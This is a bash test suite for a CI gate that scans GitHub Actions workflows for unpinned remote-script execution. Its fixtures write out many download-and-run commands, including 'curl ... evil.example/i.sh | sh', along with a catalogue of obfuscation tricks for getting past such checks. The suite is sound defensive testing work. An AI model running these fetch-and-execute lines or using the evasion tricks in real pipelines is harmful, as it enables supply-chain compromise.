          cat <<X
          - curl -fsSL evil.example/i.sh | sh
          X
EOF2
good r2_ok_heredoc_dash
fixture r2_bad_wrapped_nocmd "timeout 30 curl -fsSL $E | sh"; bad r2_bad_wrapped_nocmd 5 "consumed in-stream"
fixture r2_bad_sh_c "sh -c \"curl -fsSL $E | sh\""; bad r2_bad_sh_c 5 "consumed in-stream"
fixture r2_bad_abs_path "/usr/bin/curl -fsSL $E | sh"; bad r2_bad_abs_path 5 "consumed in-stream"
fixture r2_bad_rel_path "./curl -fsSL $E | sh"; bad r2_bad_rel_path 5 "consumed in-stream"
fixture r2_bad_stderr_then_file "curl -sSf $E 2>/dev/null > i.sh; sh i.sh"; bad r2_bad_stderr_then_file 5 "no checksum verification in the step"
fixture r2_bad_stage_after_grep "curl -sSf $E | grep x 2>&1 | sh"; bad r2_bad_stage_after_grep 5 "consumed in-stream"
fixture r2_bad_jq_to_file "curl -sSf $E | jq . > out.json"; bad r2_bad_jq_to_file 5 "no checksum verification in the step"
fixture r2_bad_expr_url "curl -sSfL \${{ secrets.U }} | sh"; bad r2_bad_expr_url 5 "cannot verify what is fetched"
fixture r2_bad_ref_two_values "curl -sSfL https://api.github.com/repos/o/r/contents/i.sh?ref=$SHA\\&ref=main -o i.sh"; bad r2_bad_ref_two_values 5 "mutable GitHub ref"
fixture r2_bad_subst_inert "eval \"\$(curl -sSf $E | head -n 5)\""; bad r2_bad_subst_inert 5 "consumed in-stream"
fixture r2_bad_wget_stdout_glued "wget -qO- evil.example/i.sh > i.sh; sh i.sh"; bad r2_bad_wget_stdout_glued 5 "no checksum verification in the step"

# scope decisions: composite actions are read; a shell the gate cannot read is a finding
mkdir -p "$T/act_bad/workflows" "$T/act_bad/actions/setup" "$T/act_ok/workflows" "$T/act_ok/actions/setup"
printf 'jobs:\n  j:\n    steps:\n      - run: echo fine\n' | tee "$T/act_bad/workflows/w.yaml" > "$T/act_ok/workflows/w.yaml"
printf 'runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: curl -sSfL %s | sh\n' "$M" > "$T/act_bad/actions/setup/action.yml"
printf 'runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: curl -sSfL https://raw.githubusercontent.com/o/r/%s/i.sh | sh\n' "$SHA" > "$T/act_ok/actions/setup/action.yml"
composite_action_case() {
  local o rc; o="$(bash "$GATE" "$T/act_bad/workflows" 2>&1)"; rc=$?
  [[ $rc == 1 ]] && grep -qF "action.yml:5:" <<<"$o" && grep -qF "fetch does not match an accepted shape" <<<"$o"; check "actions dir: an unpinned fetch in a composite action fails naming action.yml:5" $?
}
composite_action_case
bash "$GATE" "$T/act_ok/workflows" >/dev/null 2>&1; check "actions dir: a pinned composite action passes" $?
mk sh_pwsh <<EOF2
jobs:
  j:
    steps:
      - name: x
        shell: pwsh
        run: echo hi
EOF2
bad sh_pwsh 6 "unsupported shell, cannot verify"
mk sh_python_after <<EOF2
jobs:
  j:
    steps:
      - run: echo hi
        shell: python
EOF2
bad sh_python_after 4 "unsupported shell, cannot verify"
mk sh_expr <<'EOF2'
jobs:
  j:
    steps:
      - shell: ${{ matrix.shell }}
        run: echo hi
EOF2
bad sh_expr 5 "unsupported shell, cannot verify"
mk sh_defaults <<EOF2
defaults:
  run:
    shell: pwsh
jobs:
  j:
    steps:
      - run: echo hi
EOF2
bad sh_defaults 3 "unsupported shell, cannot verify"
mk sh_bash_ok <<EOF2
defaults:
  run:
    shell: bash
jobs:
  j:
    steps:
      - shell: bash -e {0}
        run: echo hi
      - shell: sh
        run: echo hi
EOF2
good sh_bash_ok

# ============ PS-A4: one fixture per rule/branch/table cell that the mutation run showed was not pinned ============
# provenance: candidate; ttl: 2027-04-01; pinning: true (each case pins one rule: removing the rule must turn it red)
RAW=https://raw.githubusercontent.com/o/r/main/i.sh
for spec in \
  "r3_echo_mention|echo curl $E | sh" \
  "r3_hash_mention|hash curl $E | sh" \
  "r3_apt_mention|apt install curl $E | sh" \
  "r3_aptget_mention|apt-get install curl $E | sh" \
  "r3_post_raw_X|curl -sf -X POST -d x $RAW" \
  "r3_post_raw_request|curl -sf --request PUT $RAW" \
  "r3_post_raw_d|curl -sf -d x $RAW" \
  "r3_post_raw_T|curl -sf -T f $RAW" \
  "r3_post_wget|wget -qO- --post-data=x $RAW" \
  "r3_devnull_redir|curl -sf $RAW >/dev/null" \
  "r3_head_I|curl -sfI $RAW" \
  "r3_head_pipe_inert|curl -sSf $E | head -n 1" ; do
  fixture "${spec%%|*}" "${spec#*|}"
done
for c in r3_echo_mention r3_hash_mention r3_apt_mention r3_aptget_mention r3_post_raw_X r3_post_raw_request r3_post_raw_d r3_post_raw_T r3_post_wget r3_devnull_redir r3_head_I r3_head_pipe_inert; do good "$c"; done
for spec in \
  "r3_get_raw|curl -sf -X GET $RAW|mutable GitHub ref" \
  "r3_stderr_null|curl -sf $RAW 2>/dev/null|mutable GitHub ref" \
  "r3_stderr_null_sp|curl -sf $RAW 2> /dev/null|mutable GitHub ref" \
  "r3_url_opt|curl -sSf --url $E | sh|consumed in-stream" \
  "r3_dollar_beside_pinned|curl -sSfL \"\$U\" https://raw.githubusercontent.com/o/r/$SHA/i.sh | sh|cannot verify" \
  "r3_codeload_kind|curl -sSfL -o a.tgz https://codeload.github.com/o/r/foo/$SHA|unrecognised GitHub URL shape" \
  "r3_codeload_noref|curl -sSfL -o a.tgz https://codeload.github.com/o/r/tar.gz|unrecognised GitHub URL shape" \
  "r3_api_orgs|curl -sSfL -o a.tgz https://api.github.com/orgs/o/x/tarball/$SHA|unrecognised GitHub URL shape" \
  "r3_api_blobs|curl -sSfL -o a.json https://api.github.com/repos/o/r/git/blobs/$SHA|unrecognised GitHub URL shape" \
  "r3_sum_word_x|curl -sSfL -o a $E && sha256sum a x|no checksum verification in the step" ; do
  fixture "${spec%%|*}" "$(cut -d'|' -f2- <<<"$spec" | sed 's/|[^|]*$//')"
  bad "${spec%%|*}" 5 "${spec##*|}"
done
fixture r3_unknown_first_word "5 echo curl $E | sh"; bad r3_unknown_first_word 5 "consumed in-stream"

# ======================= PS-A5: round-4 validator holes =======================
# provenance: candidate; ttl: 2027-04-01; pinning: true (each case pins one accepted-then bypass the validator reproduced)
# step5 NAME: a workflow whose step run is a block scalar; the body lines (stdin) start on line 6
step5() { mkdir -p "$T/$1"; { printf 'jobs:\n  j:\n    steps:\n      - name: x\n        run: |\n'; sed 's/^/          /'; } > "$T/$1/w.yaml"; }
G=https://raw.githubusercontent.com/o/r/main/i.sh
P=https://raw.githubusercontent.com/o/r/$SHA/i.sh
# 1. one sink per curl CALL: a URL without its own output option goes to stdout
for spec in \
  "a5_two_urls|curl -fsSL -o /dev/null https://example.com/ping $G | sh|consumed in-stream" \
  "a5_next|curl -fsSL -o /dev/null https://example.com/ping --next $G | sh|consumed in-stream" \
  "a5_head_next|curl -fsSL -I https://example.com/ping --next $G | sh|consumed in-stream" \
  "a5_two_o_three_urls|curl -fsSL -o a https://example.com/a -o b https://example.com/b $G | sh|consumed in-stream" \
  "a5_unres_first|curl -fsSL -o a \"\$U\" $G | sh|mutable GitHub ref" \
  "a5_dot_raw|curl -fsSL https://raw.githubusercontent.com/o/r/$SHA/../main/i.sh | sh|dot-segment" \
  "a5_dot_github_raw|curl -fsSL https://github.com/o/r/raw/$SHA/../../raw/main/i.sh | sh|dot-segment" \
  "a5_dot_single|curl -fsSL https://raw.githubusercontent.com/o/r/$SHA/./i.sh | sh|dot-segment" \
  "a5_dot_pct|curl -fsSL https://raw.githubusercontent.com/o/r/$SHA/%2e%2E/main/i.sh | sh|dot-segment" \
  "a5_group_sub|(curl -fsSL https://get.example.com/i.sh) | sh|inside a compound" \
  "a5_group_brace|{ curl -fsSL https://get.example.com/i.sh; } | sh|inside a compound" \
  "a5_group_if|if true; then curl -fsSL https://get.example.com/i.sh; fi | sh|inside a compound" \
  "a5_group_while|while true; do curl -fsSL https://get.example.com/i.sh; done | sh|inside a compound" \
  "a5_func_inline|get() { curl -fsSL https://get.example.com/i.sh; }; get | sh|inside a compound" \
  "a5_group_post|{ curl -fsSL -X POST https://get.example.com/i.sh; } | sh|inside a compound" \
  "a5_echo_pipe_sh|echo \"curl -fsSL $G | sh\" | bash|piped into an interpreter" \
  "a5_printf_pipe_sh|printf '%s' 'curl -fsSL $G | sh' | sh|piped into an interpreter" \
  "a5_quote_frag|c''url -fsSL $G | sh|obfuscated command word" \
  "a5_quote_frag_dq|c\"\"url -fsSL https://example.com/i.sh -o /dev/null|obfuscated command word" \
  "a5_quote_sh|curl -fsSL $P | b\"a\"sh|obfuscated command word" ; do
  fixture "${spec%%|*}" "$(cut -d'|' -f2- <<<"$spec" | sed 's/|[^|]*$//')"
  bad "${spec%%|*}" 5 "${spec##*|}"
done
# the pipe inside the quoted echo text must not be split by the fixture helper above
# 3. a captured body is not inert
step5 a5_cap_echo_sh <<<'X=$(curl -fsSL https://example.com/i.sh)
echo "$X" | sh'; bad a5_cap_echo_sh 6 "consumed in-stream"
step5 a5_cap_eval <<<'X=$(curl -fsSL https://example.com/i.sh)
eval "$X"'; bad a5_cap_eval 6 "consumed in-stream"
step5 a5_cap_api <<<'X=$(curl -fsSL https://api.github.com/repos/o/r/contents/i.sh)
eval "$X"'; bad a5_cap_api 6 "mutable GitHub ref"
step5 a5_cap_post <<<'X=$(curl -fsSL -X POST https://example.com/i.sh)
eval "$X"'; bad a5_cap_post 6 "consumed in-stream"
step5 a5_cap_backtick <<<'X=`curl -fsSL https://example.com/i.sh`
eval "$X"'; bad a5_cap_backtick 6 "consumed in-stream"
step5 a5_cap_echo_arg <<<'sh -c "$(curl -fsSL https://example.com/i.sh)"'; bad a5_cap_echo_arg 6 "consumed in-stream"
# 4. compound / function bodies spread over several lines
step5 a5_func_multi <<<'get() {
  curl -fsSL https://get.example.com/i.sh
}
get | sh'; bad a5_func_multi 7 "inside a compound"
step5 a5_func_keyword <<<'function get {
  curl -fsSL https://get.example.com/i.sh
}
get | sh'; bad a5_func_keyword 7 "inside a compound"
step5 a5_if_multi <<<'if true; then
  curl -fsSL https://get.example.com/i.sh
fi | sh'; bad a5_if_multi 7 "inside a compound"
# 2/5 obfuscation by backslash-newline: the shell joins cu\<nl>rl into curl
step5 a5_backslash_split <<<'cu\
rl -fsSL https://example.com/i.sh | sh'; bad a5_backslash_split 6 "obfuscated command word"
# 5. a file the parser cannot read is not clean
mkdir -p "$T/a5_json"; printf '%s\n' '{"jobs":{"a":{"steps":[{"run":"curl -fsSL https://example.com/i.sh | sh"}]}}}' > "$T/a5_json/w.yaml"
bad a5_json 1 "could not read 1 run step(s)"
mkdir -p "$T/a5_flow_run"; printf 'jobs:\n  j:\n    steps:\n      - {run: "curl -fsSL https://example.com/i.sh | sh"}\n' > "$T/a5_flow_run/w.yaml"
bad a5_flow_run 4 "unparsed workflow shapes are not accepted"
mkdir -p "$T/a5_quoted_key"; printf 'jobs:\n  j:\n    steps:\n      - "run": curl -fsSL https://example.com/i.sh | sh\n' > "$T/a5_quoted_key/w.yaml"
bad a5_quoted_key 4 "could not read 1 run step(s)"
mkdir -p "$T/a5_steps_only"; printf 'jobs:\n  j:\n    steps:\n      - name: x\n' > "$T/a5_steps_only/w.yaml"
bad a5_steps_only 1 "could not read 1 run step(s)"

# the shapes that must stay accepted (non-regression for the new rules)
for spec in \
  "a5_ok_pinned_in_group|(curl -fsSL $P) | sh" \
  "a5_ok_pinned_in_if|if true; then curl -fsSL $P | sh; fi" \
  "a5_ok_discard_in_if|if ! curl -fsS -o /dev/null https://example.com/health; then exit 1; fi" \
  "a5_ok_two_urls_two_o|curl -fsSL -o a https://example.com/a -o b https://example.com/b && sha256sum -c s" \
  "a5_ok_two_urls_O_all|curl -fsSL --remote-name-all https://example.com/a https://example.com/b && sha256sum -c s" \
  "a5_ok_head_two|curl -fsSI https://example.com/a https://example.com/b" \
  "a5_ok_jq_assign|V=\$(curl -fsSL https://api.github.com/repos/o/r/releases | jq -r .x)" \
  "a5_ok_pinned_dotted_name|curl -fsSL https://raw.githubusercontent.com/o/r/$SHA/a.b/c.d.sh | sh" \
  "a5_ok_echo_quoted_nopipe|echo \"do not curl $G | sh\"" \
  "a5_ok_quoted_url|curl -fsSL \"$P\" | sh" \
  "a5_ok_pinned_dotted_pct|curl -fsSL https://raw.githubusercontent.com/o/r/$SHA/a%20b.sh | sh" ; do
  fixture "${spec%%|*}" "${spec#*|}"
  good "${spec%%|*}"
done

# ======================= PS-A6: allowlist + wholesale refusal of obfuscation =======================
# provenance: candidate; ttl: 2027-04-01; pinning: true (each case pins one primitive, shape or near-miss)
badx() { # STRICT from here on (PS-A6 cases): REFUSED rc=1, naming the line AND the finding text
  local o rc; o="$(bash "$GATE" "$T/$1" 2>&1)"; rc=$?
  [[ $rc == 1 ]] && grep -qF "w.yaml:$2:" <<<"$o" && { [[ -z "${3:-}" ]] || grep -qF -- "$3" <<<"$o"; }; check "$1: rc=1 names w.yaml:$2${3:+ ($3)}" $?
}
H64=0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef
RAW="https://raw.githubusercontent.com/o/r/$SHA/i.sh"
REL=https://github.com/o/r/releases/download/v1.2.3/tool.tgz
wf() { # name, then step run text on stdin; run: | block, first run line is file line 6
  mkdir -p "$T/$1"; { printf 'jobs:\n  j:\n    steps:\n      - name: x\n        run: |\n'; sed 's/^/          /'; } > "$T/$1/w.yaml"; }
ref() { wf "$1" <<<"$2"; badx "$1" 6 "${3:-}"; }          # one-line refused
acc() { wf "$1" <<<"$2"; good "$1"; }                     # one-line accepted
# R0: double-quoted scalar with escapes
mkdir -p "$T/a6_r0_dq"; printf 'jobs:\n  j:\n    steps:\n      - run: "echo \\x2f hi"\n' > "$T/a6_r0_dq/w.yaml"; badx a6_r0_dq 4 "double-quoted run scalar with escapes"
mkdir -p "$T/a6_r0_dq_url"; printf 'jobs:\n  j:\n    steps:\n      - run: "curl -sSfL https:\\x2f\\x2fraw.githubusercontent.com\\x2fo\\x2fr\\x2f..\\x2f..\\x2fmain\\x2fi.sh | sh"\n' > "$T/a6_r0_dq_url/w.yaml"; badx a6_r0_dq_url 4 "escapes"
mkdir -p "$T/a6_r0_dq_cmd"; printf 'jobs:\n  j:\n    steps:\n      - run: "c\\x75rl -sSfL %s | sh"\n' "$RAW" > "$T/a6_r0_dq_cmd/w.yaml"; badx a6_r0_dq_cmd 4 "escapes"
mkdir -p "$T/a6_r0_sq"; printf 'jobs:\n  j:\n    steps:\n      - run: '"'"'curl -sSfL %s | sh'"'"'\n' "$RAW" > "$T/a6_r0_sq/w.yaml"; good a6_r0_sq
mkdir -p "$T/a6_r0_dq_plain"; printf 'jobs:\n  j:\n    steps:\n      - run: "curl -sSfL %s | sh"\n' "$RAW" > "$T/a6_r0_dq_plain/w.yaml"; good a6_r0_dq_plain
# R2 primitives (each its own finding text)
ref a6_r2_ansi "\$'c\\x75rl' -sSfL $RAW | sh" "ANSI-C"
ref a6_r2_backtick 'V=`curl -sSfL https://example.com/x`' "on a line that holds a fetch trigger"
ref a6_r2_subst "V=\$(curl -sSfL $RAW | cat)" "command substitution"
ref a6_r2_eval 'eval "c""url -sSfL https://example.com/i.sh"' "eval is refused"
ref a6_r2_exec "exec curl -sSf -o /dev/null $RAW" "exec is refused"
ref a6_r2_source "source <(curl -sSfL $RAW)" "source/. of a process"
ref a6_r2_procsub "bash <(curl -sSfL $RAW)" "process substitution"
ref a6_r2_shc "sh -c 'curl -sSfL $RAW'" "interpreter given its program"
ref a6_r2_pyc "python3 -c 'import urllib.request as u; u.urlopen(\"https://example.com\")'" "interpreter given its program"
ref a6_r2_quoteword "c''url -sSfL $RAW | sh" "contains a quote"
ref a6_r2_quoteword2 "curl -sSfL $RAW | b\"a\"sh" "contains a quote"
ref a6_r2_varadj 'curl -sSfL https://example.com/${X}rl | sh' "variable adjacent"
ref a6_r2_wrap_env "env curl -sSf -o /dev/null $RAW" "wrapper"
ref a6_r2_wrap_sudo "sudo curl -sSf -o /dev/null $RAW" "wrapper"
ref a6_r2_next "curl -sSf -o /dev/null $RAW --next $RAW" "curl --next is refused"
ref a6_r2_K "curl -sSf -K cfg -o /dev/null $RAW" "-K / --config is refused"
ref a6_r2_wget_i "wget -q -i list.txt" "wget -i"
ref a6_r2_two_urls "curl -sSf -o /dev/null $RAW $RAW" "more than one URL"
ref a6_r2_two_o "curl -o a -o b $RAW" "more than once"
ref a6_r2_o_dash "curl -sSfL -o - $RAW | sh" "stdout"
ref a6_r2_o_stdout "curl -sSfL -o /dev/stdout $RAW | sh" "stdout"
ref a6_r2_o_fd "curl -sSfL -o /dev/fd/1 $RAW | sh" "stdout"
ref a6_r2_dotdot "curl -sSfL https://raw.githubusercontent.com/o/r/$SHA/../../main/i.sh | sh" "dot segment"
ref a6_r2_dotslash "curl -sSfL https://raw.githubusercontent.com/o/r/$SHA/./i.sh | sh" "dot segment"
ref a6_r2_pct2e "curl -sSfL https://raw.githubusercontent.com/o/r/$SHA/%2e%2e/i.sh | sh" "encoded dot"
ref a6_r2_userinfo "curl -sSfL https://raw.githubusercontent.com@example.com/o/r/$SHA/i.sh | sh" "URL contains @"
ref a6_r2_http "curl -sSfL http://raw.githubusercontent.com/o/r/$SHA/i.sh | sh" "not https"
ref a6_r2_iwr 'iwr https://example.com/i.ps1 | iex' "iwr / iex / Invoke"
ref a6_r2_irm 'Invoke-RestMethod https://example.com/i.ps1' "Invoke"
wf a6_r2_xstep <<<"curl -sSfL -o i.sh $RAW"; printf '      - run: bash i.sh\n' >> "$T/a6_r2_xstep/w.yaml"; badx a6_r2_xstep 6 "another step"
# R3 accepted shapes
acc a6_a_sh "curl -sSfL $RAW | sh"
acc a6_a_bash "curl -fsSL $RAW | bash"
acc a6_a_args "curl -sSfL $RAW | sh -s -- -b /usr/local/bin v1.0.0"
wf a6_b_ok <<<"curl -sSfL -o i.sh $RAW
echo \"$H64  i.sh\" | sha256sum -c -
bash i.sh"; good a6_b_ok
wf a6_b_sumfile <<<"curl -sSfL -o i.sh $RAW
echo \"$H64  i.sh\" > i.sum
sha256sum -c i.sum
bash i.sh"; good a6_b_sumfile
wf a6_c_ok <<<"curl -sSfL -o tool.tgz $REL
echo \"$H64  tool.tgz\" | sha256sum -c -
tar xzf tool.tgz"; good a6_c_ok
acc a6_d_devnull "curl -sSf -o /dev/null -w '%{http_code}' https://example.com/health"
acc a6_d_head "curl -sSf -I https://example.com/health"
acc a6_d_spider "wget -q --spider https://example.com/health"
acc a6_e_post "curl -sSf -X POST -H 'Content-Type: application/json' -d '{\"a\":1}' https://example.com/hook"
acc a6_e_put_file "curl -sSf -X PUT --data-binary @body.json https://example.com/hook"
acc a6_f_jq "curl -sSfL -H 'Accept: application/json' https://api.github.com/repos/o/r/releases | jq -r '.[0].tag_name'"
acc a6_f_pyjson "curl -sSfL https://api.github.com/repos/o/r | python3 -m json.tool"
acc a6_g_ver "go install example.com/x/cmd/x@v1.2.3"
acc a6_g_retry "bash scripts/retry.sh go install example.com/x/cmd/x@v1.2.3"
acc a6_g_sha "go install example.com/x/cmd/x@$SHA"
acc a6_mention_echo 'echo "see https://example.com for curl docs"'
# R3 near-misses (each REFUSED)
ref a6_a_39hex "curl -sSfL https://raw.githubusercontent.com/o/r/${SHA%?}/i.sh | sh" "accepted shape"
ref a6_a_k "curl -sSfLk $RAW | sh" "accepted shape"
ref a6_a_two_urls "curl -sSfL $RAW $RAW | sh" "more than one URL"
ref a6_a_sh_arg_pipe "curl -sSfL $RAW | sh -s -- 'a;b' | tee x" "accepted shape"
ref a6_a_sink_python "curl -sSfL $RAW | python3" "accepted shape"
wf a6_b_late_sum <<<"curl -sSfL -o i.sh $RAW
bash i.sh
echo \"$H64  i.sh\" | sha256sum -c -"; badx a6_b_late_sum 6 "sha256"
wf a6_b_nosum <<<"curl -sSfL -o i.sh $RAW
bash i.sh"; badx a6_b_nosum 6 "sha256"
wf a6_b_short_sum <<<"curl -sSfL -o i.sh $RAW
echo \"${H64%?}  i.sh\" | sha256sum -c -"; badx a6_b_short_sum 6 "sha256"
wf a6_c_latest <<<"curl -sSfL -o t.tgz https://github.com/o/r/releases/download/latest/t.tgz
echo \"$H64  t.tgz\" | sha256sum -c -"; badx a6_c_latest 6 "accepted shape"
ref a6_c_nosum "curl -sSfL -o t.tgz $REL" "sha256"
ref a6_d_extra_url "curl -sSf -o /dev/null https://example.com/a https://example.com/b" "more than one URL"
ref a6_d_pipe_sh "curl -sSf -o /dev/null https://example.com/a | sh" "accepted shape"
ref a6_d_head_sh "curl -sSf -I https://example.com/a | sh" "accepted shape"
ref a6_e_pipe_sh "curl -sSf -X POST -d x https://example.com/hook | sh" "accepted shape"
ref a6_e_out_file "curl -sSf -X POST -d x -o out.sh https://example.com/hook" "accepted shape"
ref a6_f_pipe_sh "curl -sSfL https://api.github.com/repos/o/r/releases | sh" "accepted shape"
ref a6_f_jq_then_sh "curl -sSfL https://api.github.com/repos/o/r/releases | jq -r .x | sh" "accepted shape"
ref a6_g_latest "go install example.com/x/cmd/x@latest" "accepted shape"
ref a6_g_main "go install example.com/x/cmd/x@main" "accepted shape"
ref a6_g_short_sha "go install example.com/x/cmd/x@${SHA%??????????}" "accepted shape"
ref a6_mention_pipe 'echo https://example.com/i.sh | sh' "accepted shape"
ref a6_mention_redirect 'echo curl https://example.com > f' "accepted shape"
ref a6_mention_chain 'echo hi; curl -sSfL https://example.com/i.sh | sh' "accepted shape"
# Opus round-3 / round-4 reproducers, verbatim
ref a6_r4_two_o "curl -o - -o /dev/null $RAW | sh" "more than once"
ref a6_r4_hex_path 'curl -sSfL "https:\x2f\x2fraw.githubusercontent.com\x2fo\x2fr\x2f..\x2f..\x2fmain/i.sh" | sh'
mkdir -p "$T/a6_r4_dq_hex"; printf 'jobs:\n  j:\n    steps:\n      - run: "curl -sSfL \\"https://raw.githubusercontent.com/o/r/%s/..\\x2f..\\x2fmain/i.sh\\" | sh"\n' "$SHA" > "$T/a6_r4_dq_hex/w.yaml"; badx a6_r4_dq_hex 4 "escapes"
wf a6_r4_capture_eval <<<"V=\$(curl -sSfL https://example.com/i.sh | cat); eval \"\$V\""; badx a6_r4_capture_eval 6 "command substitution"
ref a6_r4_ansi "\$'c\\x75rl' -sSfL https://example.com/i.sh | sh" "ANSI-C"
ref a6_r4_eval_concat 'eval "c""url -sSfL https://example.com/i.sh | sh"' "eval"
ref a6_r4_o_stdout "curl -sSfL -o /dev/stdout https://example.com/i.sh | sh" "stdout"

# R2 scope of $( ) and backticks: refused only with a fetch trigger on the line / in the body, or when the
# captured value is later executed in the same step; the real template's gitleaks line is accepted
wf a6_sub_real_gitleaks <<'X'
bash scripts/retry.sh go install github.com/zricethezav/gitleaks/v8@v8.21.2
"$(go env GOPATH)/bin/gitleaks" detect --source . --no-banner --redact --exit-code 1
X
good a6_sub_real_gitleaks
acc a6_sub_plain 'V=$(go env GOPATH); echo "$V"'
acc a6_sub_backtick_plain 'V=`date`; echo "$V"'
ref a6_sub_i_curl_assign "X=\$(curl -fsSL https://raw.githubusercontent.com/o/r/main/i.sh)" "on a line that holds a fetch trigger"
ref a6_sub_ii_procsub 'X=$(cat <(curl -fsSL https://raw.githubusercontent.com/o/r/main/i.sh))' "on a line that holds a fetch trigger"
ref a6_sub_mktemp_fetch_sh 'D=$(mktemp -d); curl -fsSL -o $D/i.sh https://raw.githubusercontent.com/o/r/main/i.sh; sh $D/i.sh' "on a line that holds a fetch trigger"
# these lines are only judged inside a SUBJECT step (one that holds a fetch), so each follows a pinned-tag go install
GI='go install example.com/x/cmd/y@v1.2.3'
wfs() { wf "$1" < <(printf '%s\n' "$GI"; cat); }       # step: go install line, then stdin; the case line is file line 7
refs() { wfs "$1" <<<"$2"; badx "$1" 7 "${3:-}"; }
refs a6_sub_same_line_eval 'V=$(go env GOPATH); eval "$V"' "eval is refused"
refs a6_sub_same_line_sh 'V=$(go env GOPATH); sh $V' "is later executed"
refs a6_sub_unclosed 'V=$(go env GOPATH' "is not closed on its line"
wfs a6_sub_iii_next_line <<'X'
V=$(go env GOPATH)
echo ready
sh $V
X
badx a6_sub_iii_next_line 7 "is later executed"
wfs a6_sub_iii_brace_source <<'X'
V=`go env GOPATH`
source ${V}
X
badx a6_sub_iii_brace_source 7 "is later executed"
wfs a6_sub_iii_dot <<'X'
V=$(go env GOPATH)
. $V
X
badx a6_sub_iii_dot 7 "is later executed"
wfs a6_sub_iii_exec <<'X'
V=$(go env GOPATH)
exec $V
X
badx a6_sub_iii_exec 7 "is later executed"
wfs a6_sub_iii_eval <<'X'
V=$(go env GOPATH)
eval $V
X
badx a6_sub_iii_eval 7 "is later executed"
refs a6_sub_unclosed_bt 'V=`go env GOPATH' "is not closed on its line"
wfs a6_sub_other_var_ok <<'X'
V=$(go env GOPATH)
sh $W
X
# PS-A9 RE-EXPECTED toward REFUSED: running a variable (sh $W) executes a file the repository cannot be shown to track
badx a6_sub_other_var_ok 8 "executes a file the repository does not track"
mkdir -p "$T/a6_glue"; printf 'jobs:\n  j:\n    steps:\n      - run: |\n          curl -sSfL %s | s\\\n          h\n' "$RAW" > "$T/a6_glue/w.yaml"; badx a6_glue 5 "backslash-newline splits a word"

# ======================= PS-A8 (round 6): four bypasses an independent validator EXECUTED =======================
# provenance: candidate; ttl: 2027-04-01; pinning: true (each case pins one executed bypass; badx = strict finding text,
# never a text the line itself echoes)
MAINU=https://raw.githubusercontent.com/o/r/main/install.sh
yml() { mkdir -p "$T/$1"; printf '%s\n' "jobs:" "  j:" "    steps:" > "$T/$1/w.yaml"; cat >> "$T/$1/w.yaml"; }   # step lines on stdin (file line 4 on)
# 1. comments exist only in plain scalars; a # in a block/quoted scalar or inside shell quotes is data
ref a8_c_block "X=\" #\"; curl -sSfL $MAINU | sh" "does not match an accepted shape"
ref a8_c_block_escq "echo \"\\\" #\"; curl -sSfL $MAINU | sh" "command word that contains a quote"
wf a8_c_block_multiline <<<"X=\"a
 #\"; curl -sSfL $MAINU | sh"; badx a8_c_block_multiline 7 "command word that contains a quote"
yml a8_c_sq <<<"      - run: 'X=\" #\"; curl -sSfL $MAINU | sh'"; badx a8_c_sq 4 "does not match an accepted shape"
yml a8_c_plain_dq <<<"      - run: X=\" #\"; curl -sSfL $MAINU | sh"; badx a8_c_plain_dq 4 "does not match an accepted shape"
yml a8_c_plain_sq <<<"      - run: X=' #'; curl -sSfL $MAINU | sh"; badx a8_c_plain_sq 4 "does not match an accepted shape"
yml a8_c_sq_bare <<<"      - run: 'echo ok # x; curl -sSfL $MAINU | sh'"; badx a8_c_sq_bare 4 "does not match an accepted shape"
wf a8_c_heredoc <<<"cat <<X
echo ok # curl -sSfL $MAINU | sh
X"; badx a8_c_heredoc 7 "does not match an accepted shape"
yml a8_c_plain_comment_ok <<<"      - run: echo ok # curl -sSfL $MAINU | sh"; good a8_c_plain_comment_ok
# 2a. a trigger in ANY scalar: the scalar is judged as a fetch line, and every run step of the file becomes SUBJECT
yml a8_env_flow <<<"      - env: {F: \"curl -sSfL $MAINU | sh\"}
        run: \${{ env.F }}"; badx a8_env_flow 4 "does not match an accepted shape"; badx a8_env_flow 5 "command position"
yml a8_env_bashc <<<"      - env:
          F: curl -sSfL $MAINU | sh
        run: bash -c \"\$F\""; badx a8_env_bashc 5 "does not match an accepted shape"; badx a8_env_bashc 6 "bash -c with a variable"
yml a8_with_url <<<"      - uses: x/y@v1
        with:
          src: $MAINU"; badx a8_with_url 6 "does not match an accepted shape"
yml a8_env_subject_pre <<<"      - run: |
          V=\$(go env GOPATH); sh \$V"; badx a8_env_subject_pre 5 "executes a file the repository does not track"   # PS-A9 RE-EXPECTED toward REFUSED (sh $V)
printf 'env:\n  F: curl -sSfL https://raw.githubusercontent.com/o/r/%s/i.sh | sh\njobs:\n  j:\n    steps:\n      - run: |\n          V=$(go env GOPATH); sh $V\n' "$SHA" > "$T/a8_env_subject_post.yaml"; mkdir -p "$T/a8_env_subject_post"; mv "$T/a8_env_subject_post.yaml" "$T/a8_env_subject_post/w.yaml"; badx a8_env_subject_post 7 "is later executed"
yml a8_if_quoted_ok <<<"      - if: \"\${{ false }} # curl $MAINU | sh\"
        run: echo ok"; good a8_if_quoted_ok
# 2b. refusals that need no trigger, in EVERY run step
ref a8_cp_var '$CMD --version' "command position"
ref a8_cp_brace '${CMD} --version' "command position"
ref a8_cp_expr '${{ env.F }}' "command position"
ref a8_cp_andand 'true && $CMD' "command position"
ref a8_cp_pipe 'echo x | $CMD' "command position"
ref a8_cp_semi 'echo x; ${{ env.F }}' "command position"
ref a8_cp_quoted '"$CMD" --version' "command position"
ref a8_bashc_var 'bash -c "$F"' "bash -c with a variable"
ref a8_shc_var 'sh -c $F' "bash -c with a variable"
ref a8_eval 'eval "$F"' "eval is refused"
ref a8_exec 'exec ./run.sh' "exec is refused"
# PS-A9 RE-EXPECTED toward ACCEPTED: a variable glued to letters in an ARGUMENT is ordinary (echo "v${VERSION}"); only the COMMAND word is judged
acc a8_glue_after 'echo a${V}b'
acc a8_glue_before 'echo pre$V'
acc a8_glue_after_only 'echo ${V}b'
ref a9_glue_cmd_before 'pre$V --x' "glued to letters"
ref a9_glue_cmd_after 'true; foo${V}b arg' "glued to letters"
ref a8_url_dollar 'ls $S//x' "mixes a variable with //"
ref a8_url_dollar2 'cd $D; ls //x' "mixes a variable with //"
ref a8_wordsplit 'C=cu; S=https:; E=.; ${C}rl -sSfL $S//raw.github${E}usercontent.com/o/r/main/x.sh | sh' "command position"
acc a8_ok_expr_args 'echo "tag=v${{ matrix.x }}" >> $GITHUB_OUTPUT'
acc a8_ok_test_expr 'if [[ "${{ a.b }}" != "x" || "${{ c.d }}" != "y" ]]; then echo no; fi'
